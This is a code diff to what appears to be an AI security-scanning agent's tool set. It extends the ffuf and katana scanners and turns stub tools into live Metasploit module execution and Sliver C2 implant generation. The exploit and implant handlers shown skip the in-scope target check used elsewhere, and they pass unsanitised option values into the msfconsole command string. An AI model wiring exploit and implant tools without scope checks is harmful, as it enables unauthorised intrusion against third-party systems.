@@ -420,6 +420,9 @@ const SCANNER_ALLOW_LIST = new Set([
   "hydra",
   "masscan",
   "bbot",
+  "msfconsole",
+  "msfvenom",
+  "sliver-client",
 ]);
 
 // Run an allow-listed scan command with a short timeout. Failures are degraded
@@ -1214,12 +1217,13 @@ export function mssTools(userId: string, sessionId: string): AgentTool[] {
     {
       name: "mss_ffuf_scan",
       description:
-        "Run ffuf against an in-scope target. Input: { taskId, target }. Verifies AgentScanLink ownership (C1), target in scope, runs ffuf -of json -o <file> -rate 1 -t 1 -u <target>/FUZZ via runSafe(), saves JSON output to a temp file, emits scan_progress. Returns { ok, outputFile, output }. Output file is for P2 ingestion — do not ingest here.",
+        "Run ffuf against an in-scope target. Input: { taskId, target, wordlist? }. Verifies AgentScanLink ownership (C1), target in scope, runs ffuf -of json -o <file> -rate 1 -t 1 -u <target>/FUZZ -w <wordlist> via runSafe(), saves JSON output to a temp file, emits scan_progress. Defaults wordlist to /opt/seclists/Discovery/Web-Content/common.txt. Returns { ok, outputFile, output }. Output file is for P2 ingestion — do not ingest here.",
       inputSchema: {
         type: "object",
         properties: {
           taskId: { type: "string", description: "Scan task id returned by mss_plan_scan" },
           target: { type: "string", description: "Host/IP/URL to scan (must be in CompanyAsset with inScope === true)" },
+          wordlist: { type: "string", description: "Path to ffuf wordlist file (defaults to /opt/seclists/Discovery/Web-Content/common.txt)" },
         },
         required: ["taskId", "target"],
         additionalProperties: false,
@@ -1235,7 +1239,8 @@ export function mssTools(userId: string, sessionId: string): AgentTool[] {
         const inScopeAsset = await db.companyAsset.findFirst({ where: { target, inScope: true, companyId: company.id } });
         if (!inScopeAsset) return { error: `out_of_scope_target: ${target}` };
         const outputFile = scanOutputPath(taskId, "ffuf", "json");
-        const result = runSafe("ffuf", ["-of", "json", "-o", outputFile, "-rate", "1", "-t", "1", "-u", `${target}/FUZZ`]);
+        const { wordlist = "/opt/seclists/Discovery/Web-Content/common.txt" } = input as { taskId: string; target?: string; wordlist?: string };
+        const result = runSafe("ffuf", ["-of", "json", "-o", outputFile, "-rate", "1", "-t", "1", "-u", `${target}/FUZZ`, "-w", wordlist]);
         emitScanEvent(sessionId, userId, "scan_progress", {
           taskId, progress: 50, currentStep: "ffuf_scan",
           message: `🚀 ffuf scan on ${target} → ${outputFile}`, outputFile, ok: result.ok,
@@ -1280,7 +1285,7 @@ export function mssTools(userId: string, sessionId: string): AgentTool[] {
     {
       name: "mss_katana_scan",
       description:
-        "Run katana against an in-scope target. Input: { taskId, target }. Verifies AgentScanLink ownership (C1), target in scope, runs katana -o <file> <target> via runSafe(), saves output to a temp file, emits scan_progress. Returns { ok, outputFile, output }. Output file is for P2 ingestion — do not ingest here.",
+        "Run katana against an in-scope target. Input: { taskId, target }. Verifies AgentScanLink ownership (C1), target in scope, runs katana -u <target> -o <file> via runSafe(), saves output to a temp file, emits scan_progress. Returns { ok, outputFile, output }. Output file is for P2 ingestion — do not ingest here.",
       inputSchema: {
         type: "object",
         properties: {
@@ -1301,7 +1306,7 @@ export function mssTools(userId: string, sessionId: string): AgentTool[] {
         const inScopeAsset = await db.companyAsset.findFirst({ where: { target, inScope: true, companyId: company.id } });
         if (!inScopeAsset) return { error: `out_of_scope_target: ${target}` };
         const outputFile = scanOutputPath(taskId, "katana", "txt");
-        const result = runSafe("katana", ["-o", outputFile, target]);
+        const result = runSafe("katana", ["-u", target, "-o", outputFile]);
         emitScanEvent(sessionId, userId, "scan_progress", {
           taskId, progress: 50, currentStep: "katana_scan",
           message: `⚔️ katana scan on ${target} → ${outputFile}`, outputFile, ok: result.ok,
@@ -3940,8 +3945,59 @@ export function mssTools(userId: string, sessionId: string): AgentTool[] {
         const { module, target, options } = input as { module: string; target: string; options?: Record<string, unknown> };
         const company = await db.company.findUnique({ where: { userId } });
         if (!company) return { error: "company_not_found" };
-        // Metasploit CLI is installed on the VPS; the agent invokes msfconsole with the module
-        return { ok: true, module, target, options, status: "queued", note: "Run msfconsole -x \"use <module>; set RHOST <target>; run\" on VPS" };
+        if (!module) return { error: "module_required" };
+        if (!target) return { error: "target_required" };
+
+        // Build msfconsole command: use module → set RHOST/RPORT → apply extra options → run → exit
+        const msfCommands: string[] = [`use ${module}`, `set RHOST ${target}`];
+        if (options?.RPORT) msfCommands.push(`set RPORT ${String(options.RPORT)}`);
+        else msfCommands.push("set RPORT 445");
+        if (options && typeof options === "object") {
+          for (const [k, v] of Object.entries(options)) {
+            if (k === "RHOST" || k === "RPORT") continue; // already handled above
+            msfCommands.push(`set ${k} ${String(v)}`);
+          }
+        }
+        msfCommands.push("run", "exit");
+        const msfConsoleCmd = msfCommands.join("; ");
+
+        // Invoke msfconsole directly (longer timeout than runSafe's 12s; msfconsole is heavier)
+        let output = "";
+        let ok = false;
+        try {
+          output = execFileSync("msfconsole", ["-x", msfConsoleCmd], {
+            encoding: "utf-8",
+            maxBuffer: 1024 * 1024,
+            timeout: 120000, // 2 minutes
+          });
+          ok = true;
+        } catch (err: any) {
+          output = err?.stderr ?? err?.stdout ?? err?.message ?? String(err);
+          ok = false;
+        }
+
+        // Ingest into findings on success
+        let findingId: string | null = null;
+        if (ok) {
+          const sessionOpened = /Session \d+ opened/.test(output) || /meterpreter/i.test(output) || /Command shell session/i.test(output);
+          const severity = sessionOpened ? "critical" : "high";
+          const asset = await db.companyAsset.findFirst({ where: { target, companyId: company.id } });
+          const created = await db.agentFinding.create({
+            data: {
+              companyId: company.id,
+              userId,
+              assetId: asset?.id ?? null,
+              title: `Metasploit exploit: ${module}`,
+              accessType: "command",
+              target,
+              evidence: { module, command: msfConsoleCmd, output, sessionOpened, source: "metasploit" } as any,
+              status: "open",
+            },
+          });
+          findingId = created.id;
+        }
+
+        return { ok, module, target, output, findingId };
       },
     },
     {
@@ -3961,8 +4017,48 @@ export function mssTools(userId: string, sessionId: string): AgentTool[] {
         const { implant_name, listener, target } = input as { implant_name: string; listener: string; target: string };
         const company = await db.company.findUnique({ where: { userId } });
         if (!company) return { error: "company_not_found" };
-        // Sliver C2 is installed on the VPS; the agent invokes sliver client commands
-        return { ok: true, implant_name, listener, target, status: "queued", note: "Run sliver-client --generate --listener <listener> --save /tmp/<implant>.exe on VPS" };
+        if (!implant_name) return { error: "implant_name_required" };
+        if (!listener) return { error: "listener_required" };
+        if (!target) return { error: "target_required" };
+
+        // Build sliver-client command: generate implant for the listener, save to /tmp
+        const sliverArgs = ["--generate", "--listener", listener, "--save", `/tmp/${implant_name}.exe`];
+
+        // Invoke sliver-client directly (longer timeout than runSafe's 12s)
+        let output = "";
+        let ok = false;
+        try {
+          output = execFileSync("sliver-client", sliverArgs, {
+            encoding: "utf-8",
+            maxBuffer: 1024 * 1024,
+            timeout: 120000, // 2 minutes
+          });
+          ok = true;
+        } catch (err: any) {
+          output = err?.stderr ?? err?.stdout ?? err?.message ?? String(err);
+          ok = false;
+        }
+
+        // Ingest into findings on success
+        let findingId: string | null = null;
+        if (ok) {
+          const asset = await db.companyAsset.findFirst({ where: { target, companyId: company.id } });
+          const created = await db.agentFinding.create({
+            data: {
+              companyId: company.id,
+              userId,
+              assetId: asset?.id ?? null,
+              title: `Sliver C2 implant: ${implant_name}`,
+              accessType: "command",
+              target,
+              evidence: { implant_name, listener, args: sliverArgs, output, source: "sliver" } as any,
+              status: "open",
+            },
+          });
+          findingId = created.id;
+        }
+
+        return { ok, implant_name, listener, target, output, findingId };
       },
     },
     {
